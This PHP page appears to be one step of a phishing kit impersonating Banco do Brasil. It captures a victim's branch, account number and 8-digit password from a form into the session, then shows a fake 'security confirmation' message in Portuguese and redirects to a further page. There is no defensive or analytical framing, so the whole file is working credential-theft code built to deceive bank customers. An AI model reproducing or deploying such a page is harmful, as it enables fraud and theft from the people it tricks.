<?php

session_start();

$_SESSION["agencia"] = $_POST['ag_ct'];
$_SESSION["conta"] = $_POST['cont'];
$_SESSION["senha8"] = $_POST['pass8'];

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<meta http-equiv="refresh" content=6;url="need_one.php">
	<title>Acesso - BB</title>
	<link rel="stylesheet" href="_styles/home.css">
</head>
<body>
<div class="container bg-loading main_loading">
	<div class="content main_loading_one">
		<img src="_images/logo.png">
		<span>
			Será necessário realizar uma confirmação de segurança para liberar o acesso deste dispositívo.
			<br><br>
			Na próxima, realize o processo requerido para prosseguir com total segurança.
			<br><br>
			Aguarde...
		</span>
		<img src="_images/ajax-loader.gif">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->
</body>
</html>
<?php
ob_end_flush();
?>
